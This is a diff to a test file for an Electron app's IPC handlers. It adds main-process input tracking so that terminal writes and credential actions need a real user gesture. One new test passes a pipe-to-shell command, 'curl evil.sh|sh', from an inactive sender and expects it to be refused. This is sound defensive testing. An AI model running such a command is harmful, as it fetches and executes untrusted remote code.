@@ -58,6 +58,7 @@ vi.mock('@/main/browser-agent/registry', () => ({
   ),
 }))
 
+import type { WebContents } from 'electron'
 import { ipcMain, shell } from 'electron'
 import {
   copyCredential,
@@ -72,20 +73,27 @@ import {
   importChromePasswords,
   listChromeImportProfiles,
 } from '@/main/browser-import'
+import { trackInputActivity } from '@/main/input-activity'
 import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
 import { LocalFilesystemService } from '@/main/local-filesystem'
 import { TerminalService } from '@/main/terminal'
 
 const APP = 'https://sim.ai'
 
+type InputListener = (event: unknown, input: { type: string }) => void
+
+interface FakeSender {
+  session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
+  /** Marks a sender the mocked registry recognises as a browser tab. */
+  isBrowserTab?: boolean
+  isDestroyed?: () => boolean
+  on?: (channel: string, listener: InputListener) => void
+}
+
 type Handler = (
   event: {
     senderFrame: { url: string; executeJavaScript?: (source: string) => Promise<unknown> } | null
-    sender?: {
-      session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
-      /** Marks a sender the mocked registry recognises as a browser tab. */
-      isBrowserTab?: boolean
-    }
+    sender?: FakeSender
   },
   ...args: unknown[]
 ) => unknown
@@ -102,48 +110,68 @@ function collectHandlers() {
   return { invoke, on }
 }
 
-const rejectedSender = () => ({
-  session: {
-    fetch: vi.fn(async () => {
-      throw new Error('not authorized')
-    }),
-  },
-})
+/**
+ * A sender registered with the main-process input tracker, so a test can grant
+ * it a real gesture with `press`. User activation is no longer read out of the
+ * renderer, so a fixture cannot fake it by stubbing `executeJavaScript`.
+ */
+function trackedSender() {
+  const listeners: InputListener[] = []
+  const sender = {
+    session: {
+      fetch: vi.fn(async () => {
+        throw new Error('not authorized')
+      }),
+    },
+    isDestroyed: () => false,
+    on: (channel: string, listener: InputListener) => {
+      if (channel === 'input-event') listeners.push(listener)
+    },
+  }
+  trackInputActivity(sender as unknown as WebContents)
+  return {
+    sender,
+    /** Delivers one real click, satisfying both input-recency gates. */
+    press: () => {
+      for (const listener of listeners) listener({}, { type: 'mouseDown' })
+    },
+  }
+}
+
+const rejectedSender = () => trackedSender().sender
 const fileSender = rejectedSender()
 const appSender = rejectedSender()
 const evilSender = rejectedSender()
+const activeSender = trackedSender()
+const activeChooserSender = trackedSender()
 const fileEvent = {
   senderFrame: { url: 'file:///app/static/offline.html' },
   sender: fileSender,
 }
 const appEvent = { senderFrame: { url: `${APP}/workspace/ws1` }, sender: appSender }
 const activeAppEvent = {
-  senderFrame: {
-    url: `${APP}/workspace/ws1`,
-    executeJavaScript: vi.fn(async () => true),
-  },
+  senderFrame: { url: `${APP}/workspace/ws1` },
+  sender: activeSender.sender,
 }
+/** Same origin, but the main process has never seen this renderer get input. */
 const inactiveAppEvent = {
-  senderFrame: {
-    url: `${APP}/workspace/ws1`,
-    executeJavaScript: vi.fn(async () => false),
-  },
+  senderFrame: { url: `${APP}/workspace/ws1` },
+  sender: rejectedSender(),
 }
 const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
 /** The chooser anchors a native menu, so it needs a sender with a window. */
 const FAKE_WINDOW = { id: 'main-window' }
 const activeChooserEvent = {
-  senderFrame: {
-    url: `${APP}/workspace/ws1`,
-    executeJavaScript: vi.fn(async () => true),
-  },
-  sender: appSender,
+  senderFrame: { url: `${APP}/workspace/ws1` },
+  sender: activeChooserSender.sender,
 }
 
 describe('registerIpcHandlers', () => {
   let deps: IpcDeps
 
   beforeEach(() => {
+    activeSender.press()
+    activeChooserSender.press()
     vi.mocked(ipcMain.handle).mockClear()
     vi.mocked(ipcMain.on).mockClear()
     vi.mocked(shell.openExternal).mockClear()
@@ -778,6 +806,17 @@ describe('registerIpcHandlers', () => {
     await invoke.get('browser-credentials:forget')?.(activeAppEvent, 'c1')
     expect(importChromePasswords).toHaveBeenCalledWith('Default', 'replace')
     expect(forgetCredential).toHaveBeenCalledWith('c1')
+  })
+
+  it('accepts a terminal write only after the main process has seen real input', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    on.get('terminal:write')?.(inactiveAppEvent, 't1', 'curl evil.sh|sh\r')
+    expect(write).not.toHaveBeenCalled()
+
+    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r')
+    expect(write).toHaveBeenCalledWith('t1', 'ls\r')
   })
 
   it('defaults password conflicts to keeping what is already stored', async () => {
